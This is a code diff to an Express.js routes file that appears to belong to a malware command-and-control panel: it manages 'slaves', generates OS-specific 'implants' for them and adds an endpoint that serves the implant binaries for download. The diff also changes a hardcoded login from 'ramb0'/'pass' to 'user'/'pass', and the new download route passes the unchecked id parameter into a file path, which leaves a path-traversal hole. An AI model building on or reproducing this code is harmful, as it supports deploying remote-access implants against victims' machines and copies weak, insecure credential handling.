@@ -2,6 +2,7 @@
  * Route for /client 
 */
 const router = express.Router();
+const fs = require("fs");
 const userMiddleware = require("../../middlewares/UserMiddleware");
 
 const implantGenerator = require("../../helpers/ImplantGeneratorHelper")
@@ -12,7 +13,7 @@ router.post("/login", (req, res) => {
     const token = cryptoHelper.createID();
     if (serverOptions.useAuthentication) {
 
-        if (req.body.username == "ramb0" && req.body.password == "pass") {
+        if (req.body.username == "user" && req.body.password == "pass") {
             
             databaseHelper.saveAuthToken(token, req.body.username);
             res.json({token: token})
@@ -67,6 +68,7 @@ router.post("/slaves", userMiddleware.checkNewGeneration, (req, res) => {
         })
     }
 
+    // Generate implant based on OS.
     implantGenerator.generateImplant(slaveId, newSlave.os, (binaryPath) => {
 
         console.log("Generating implant success! path: " + binaryPath)
@@ -84,20 +86,28 @@ router.post("/slaves", userMiddleware.checkNewGeneration, (req, res) => {
         else
             res.status(400).json({message: err})
     })
-
-    // Generate implant.
-    // console.log("Generating new slave for os " + newSlave.os + "....");
-    // if (newSlave.payload)
-    //     console.log("With payload " + newSlave.payload)
-    // if (newSlave.variables)
-    //     console.log("Containing variables: " + JSON.stringify(newSlave.variables))
-    
 })
 
 // Retrieve all slaves.
 router.get("/slaves", userMiddleware.hasAuthToken, (req, res) => {
     
     res.json(databaseHelper.getSlaves());
+})
+
+// Implant downloader.
+router.get("/implant/:id", userMiddleware.hasAuthToken, (req, res) => {
+
+    if (!req.params.id) {
+        res.status(404).json({message: "No implant with this ID!"});
+        return;
+    }
+
+    if (!fs.existsSync("./implants/" + req.params.id)) {
+        res.status(404).json({message: "No implant with this ID!"})
+        return;
+    }
+
+    res.download("./implants/" + req.params.id);
 })
 
 // Nickname an slave.
